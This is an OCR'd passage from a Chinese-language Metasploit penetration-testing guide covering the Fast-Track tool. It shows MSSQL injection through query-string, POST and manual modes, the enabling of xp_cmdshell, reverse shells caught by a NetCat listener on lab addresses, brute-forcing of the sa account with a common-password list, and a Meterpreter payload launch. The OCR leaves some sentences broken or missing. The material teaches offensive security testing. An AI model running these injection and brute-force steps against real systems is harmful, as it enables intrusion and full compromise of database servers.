从主菜单中选择MicrosoftSQLTools开始部署攻击，之后选择MSSQLInjector，如下所
示：
Pick a list of the tools from below:
01.MSSQL Injector
2.MSSQL Bruter
3.SQLPwnage
Enteryourchoice:1
最简单的SQL注入方式是操纵查询语句字段，而这一字符串通常位于从浏览器发送到服务
器上的URL中。URL中通常包含动态查询网页信息的一些参数信息，Fast-Track通过在查询语
句参数中加入INJECTHERE，来识别出注入点，如下所示：
http://www.Secmaniac.com/index.asp?id='INJECTHERE&date=2011
当Fast-Track开始攻击漏洞时，他将查找带有id字符串的所有字段，即决定哪个字段可以
被用来进行攻击。让我们通过选择第一个选项来看攻击是如何进行的：
Enter whichSQL Injector you want touse
01.SQLInjector -Query String Parameter Attack
2.SQL Injector-POST Parameter Attack
3.SQLInjector-GETFTPPayloadAttack
Enter your choice: 1
...SnIP..·
Enter the URL of the susceptible site, remember to put ‘INJECTHERE for the
injectable parameter
Example:http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah
 Enter here: http://www.secmaniac.com/index.asp?id='INJECTHERE&date=2011
Sending initial request to enable xp_cmdshellif disabled...
Sending first portion of payload (1/4)...
Sending second portion of payload (2/4)...
Sending third portion of payload(3/4)...
Sending thelastportionof thepayload(4/4)...
165
---
## Page 193
Metasploit渗透测试指南
Running cleanup before executing the payload...
Running the payload on the server...Sending initial request to enable
xp_cmdshell if disabled...
Sending first portion of payload (1/4)...
Sending second portion of payload(2/4)...
Sending third portion of payload (3/4)...
Sending the last portion of the payload (4/4)...
Running cleanup before executing the payload...
Running the payload on the server...
listening on[any] 4444 ...
connect to[10.211.55.130] from(UNKNOwN）[10.211.55.128] 1041
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.
C:\WINDOWS\system32>
成功！完全控制了目标系统，整个过程都是通过SQL注入完成的。注意如果Web应用程
序中使用了参数化的SQL查询语句或者存储过程的话，我们的攻击将不会成功。值得一提的是，
该攻击所需要进行的配置非常少。在攻击菜单选择了SQLInjector－QueryStringParameter
AttackO后，你再为FAST-TRACK提供一个SQL注入点?，如果xp_cmdshell存储过程功能关
闭的话，Fast-Track将自动激活这个存储过程，同时尝试对MS SQL进行特权提升。
11.1.2SQL注入-POST参数攻击
Fast-Track的POST参数攻击比进行上面的查询语句攻击所需要做的配置更少。对这个攻击
单并进行攻击。
Enter which SQL Injector you want to use
1.SQL Injector -Query String Parameter Attack
2.SQL Injector -POST Parameter Attack
3.SQL Injector -GET FTP Payload Attack
  a d t  -   t
Enter your choice: 2
This portion allows you to attack all forms on a specific website without having to specify
each parameter. Just type the URL in, and Fast-Track will auto SQL inject to each parameter
looking for both error based injection as well as blind based SQL injection. Simply type
the website you want to attack，and let it roll.
Example:http://www.sqlinjectablesite.com/index.aspx
Enter the URL to attack:http://www.secmaniac.com
Forms detected...attacking the parameters in hopes of exploiting SQl Injection..
166
---
## Page 194
第11章Fast-Track
Sendingpayloadtoparameter:txtlogin
Sending payload to parameter:txtPassword
[-] The PAYLOAD is being delivered.This can take up to two minutes. [-]
listening on [any] 4444 ...
connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1041
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.
C:\WINDOWS\system32>
正如你所看到的，Fast-Track自动检测了POST提交参数，并注入了攻击参数，通过SQL
注入完全控制了目标主机。
提示：你可以使用FTP来植入你的攻击载荷，但是FTP作为对外发起网络连接一般是被
禁止的。
11.1.3手工注入
如果你有另一个IP用来监听反弹shell,或者你需要对设置进行微调。你可以使用手工注入：
Enter which SQL Injectoryou want to use
1. SQL Injector - Query String Parameter Attack
2. SQL Injector - POST Parameter Attack
3.SQL Injector -GET FTP Payload Attack
0 4. SQL Injector - GET Manual Setup Binary Payload Attack
Enteryour choice:4
The manual portion allows you to customize your attack for whatever reason.
You will need to designate where in the URL the SQL Injection is by using
'INJECTHERE
So for example, when the tool asks you for the SQL Injectable URL, type:
http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah
Enter the URL of the susceptible site, remember to put ‘INJECTHERE for the
injectibleparameter
Example: http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah
 Enter here: http://www.secmaniac.com/index.asp?id='INJECTHERE&date=2010
③Enter the IP Address of server with NetCat Listening:10.211.55.130
Enter Port numberwith NetCat listening:9090
167
---
## Page 195
Metasploit渗透测试指南
Sending initial request to enable xp_cmdshell if disabled....
Sending first portion of payload....
Sending second portion of payload....
Sending next portion of payload...
Sending thelastportion ofthepayload...
Running cleanup...
Running the payload on the server...
listening on[any]9090..
10.211.55.128: inverse host lookup failed: Unknown server error:Connection
timedout
connect to[10.211.55.130]from(UNKNOwN)[10.211.55.128]1045
Microsoft Windows[Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.
C:\WINDOWS\system32>
首先，选择手工注入选项O，其次，使用查询语句的参数攻击，把Fast-Track指向存在SQL
置。
11.1.4MS SQL 破解
栏可以找到)。当自标安装了MSSQL服务，MSSQL破解功能对Windows认证、SQL认证，
或者混合认证方式都适用。
混合认证方式允许用户同时通过Windows认证和MSSQL服务器认证。如果MSSQL安装
过程中指定了要使用混合认证模式或SQL认证模式，那么安装程序的管理员需要设置一个MS
SQL的sa用户账号（即MSSQL的数据库系统管理员）。通常情况下，管理员会选择弱口令、
空口令或者易于猜解的口令，这样使得攻击者很容易得到该口令。如果sa账户口令被暴力破解
的话，将导致攻击者使用扩展存储过程xp_cmdshell来攻陷整个系统。
TCP1433端口进行扫描。然而如果目标主机使用MSSQLServer2005或之后的版本，这些版本
采用了动态端口的策略，这样增加了猜解的难度。但是Fast-Track可以直接与Metasploit交互，
通过UDP1434端口查找出MSSQL服务器运行的动态端口。
-旦Fast-Track识别出服务端口并成功爆破sa账户口令，Fast-Track将使用高级的
binary-to-hex转换方法来植入一个攻击载荷。这个攻击的成功率相当高，特别在MSSQL广泛
使用的大型网络环境下。
168
---
## Page 196
第11章Fast-Track
Microsoft SQL Attack Tools
Pickalist ofthe toolsfrom below:
1.MSSQL Injector
2.MSSQL Bruter
3.SQLPwnage
Enteryourchoice:2
Enter the IP Address and Port Number to Attack.
Options:(a)ttempt SQL Ping andAuto Quick Brute Force
(m)ass scan and dictionarybrute
(s)ingle Target (Attack a SingleTargetwithbig dictionary)
(f)ind SQL Ports (SQL Ping)
(i） want a command prompt and know which system is vulnerable
(v)ulnerable system, I want to add a local admin on the box...
(e)nable xp cmdshell if its disabled (sql2k and sql2k5)
在我们选择了MSSQLBruter选项后，Fast-Track为我们列出了可以用来操作的各种攻击选
项。不是所有攻击在每种场景中都能够成功，甚至在有些攻击是达成同一目标的情况下。所以，
你是否了解每个选项的含义是至关重要的。
Fast-Track有如下几个攻击功能选项。
·尝试SQLPing和自动快速暴力破解功能选项是用来尝试扫描一段IP地址，使用语法
速的暴力破解。
·块扫描和字典暴力破解功能选项允许你扫描一段IP地址，并允许你自已定义口令字典。
Fast-Track自带了一个非常不错的口令字典文件，存储在bin/dict/wordlist.txt中。
·单一目标功能选项允许你对一个IP地址使用大规模口令字典进行暴力破解。
·探查SQL端口（SQLPing）功能选项仅仅是为了寻找SQL服务器地址，而不会攻击该
服务器。
·提供命令行shell功能选项：如果你已经获知了sa口令，该功能选项能为你提供一个命
令行shell。
·Vulnerable system（存有漏洞的系统）功能选项：在一个你已知存有漏洞的系统上增加
一个新的管理员账户。
的扩展存储程序。默认情况下，在SQLServer2005和之后的版本中，该功能是被禁用
的。但是Fast-Track可以自动启用该项功能。Fast-Track在使用任意攻击选项攻击远程
系统时，如果设置了这个选项，都将尝试自动启用该功能。
169
---
## Page 197
Metasploit渗透测试指南
你可以使用几个常用选项来定制攻击并尝试攻陷目标主机，最简单的就是使用快速暴力破
解选项，因为该攻击一般不会被检测出来。我们将选取快速暴力破解选项并使用内建的一个口
令字典，试图猜解出MSSQL数据库的密码。
Enter the IPAddress and Port Number to Attack.
0Options:(a)ttempt SQLPing and Auto Quick Brute Force
(m)ass scan and dictionary brute
(f)ind SQL Ports (SQL Ping)
(i)want a command prompt and know which system is vulnerable
(v)ulnerable system,I want to add a local admin on the box...
(e)nable xp_cmdshell if its disabled (sql2k and sql2k5)
Enter Option:a
 Enter username for SQL database (example:sa):sa
Configuration file not detected,running default path.
Recommend running setup.py install to configure Fast-Track.
Setting default directory...
 Enter theIP Range toscan for SQLScan(example 192.168.1.1-255):
10.211.55.1/24
ports? This wili use UDp footprinting in order to determine where the SQL
servers are at.This could take quite a long time.
① Do you want to perform advanced identification, yes or no: yes
[-]Launching SQL Ping, this may take a while to footprint....[-]
[*]Please wait while we load the module tree...
Brute forcing username: sa
[*] Please wait while we load the module tree...
Brute forcing username:sa
Be patient this could take awhile...
Brute forcing password of password2 on IP 10.211.55.128:1433
Brute forcing password of on IP 10.211.55.128:1433
Brute forcing password of password on IP 10.211.55.128:1433
10.211.55.128:1433
Brute forcing password of sqlserver on IP 10.211.55.128:1433
Brute forcing password of sql on IP 10.211.55.128:1433
Brute forcing password of password1 on IP 10.211.55.128:1433
Brute forcing password of password123 on IP 10.211.55.128:1433
Brute forcing password of complexpassword on IP 10.211.55.128:1433
Brute forcing password of database on IP 10.211.55.128:1433
Brute forcing password of server on IP 10.211.55.128:1433
Brute forcing password of changeme on IP 10.211.55.128:1433
Brute forcing password of change on IP 10.211.55.128:1433
Brute forcing password of sqlserver2000 on IP 10.211.55.128:1433
Brute forcing password of sqlserver2005 on IP 10.211.55.128:1433
170
---
## Page 198
第11章Fast-Track
Brute forcingpasswordof Sqlserver on IP 10.211.55.128:1433
Brute forcing password of SqlServer on IP 10.211.55.128:1433
Brute forcing password of Password1 on IP 10.211.55.128:1433
·.SNIP.··
The following SQL Servers were compromised:
*******************************************
1.10.211.55.128:1433 *** U/N: sa P/W: password ***
Tointeract with system,enter the SQL Server number.
Example:1.192.168.1.32 you would type 1
Enter the number:
在选择了尝试SQLPing和自动快速暴力破解O后，你将看到弹出框要求你输入SQL数据
库的用户名?，接下来输入你想要扫描的IP范围③，选择进行高级的服务器识别扫描·，尽管
扫描的速度很慢，但是却非常有效。
接下来输出的结果显示Fast-Track成功破解了一个用户名为sa密码为password的系统用
户。在这种情况下，你可以选择一个攻击载荷，然后攻陷这个系统，如下所示：
Enter number here:1
Enabling:XP_Cmdshell...
Finished trying to re-enable xp_cmdshell storedprocedureif disabled.
Configuration file not detected， running default path.
Recommend running setup.py install to configure Fast-Track.
Setting default directory...
What port do you want the payload to connect to you on: 4444
Metasploit ReverseMeterpreterUploadDetected..
Launching Meterpreter Handler.
Creating Metasploit Reverse MeterpreterPayload.
Sending payload: c88f3f9ac4bbe0e66da147e0f96efd48dad6
Sendingpayload:ac8cbc47714aaeed2672d69e251cee3dfbad
Metasploit payloaddelivered..
Converting ourpayloadtobinary,thismaytakeafew..
Cleaning up...
Launching payload, this could take up to a minute...
When finished,close the metasploit handler window to returnto other
compromised SQL Servers.
[*] Please wait while we load the module tree...
[*] Handler binding to LHOST o.0.0.0
[*]Started reverse handler
[*] Starting the payload handler...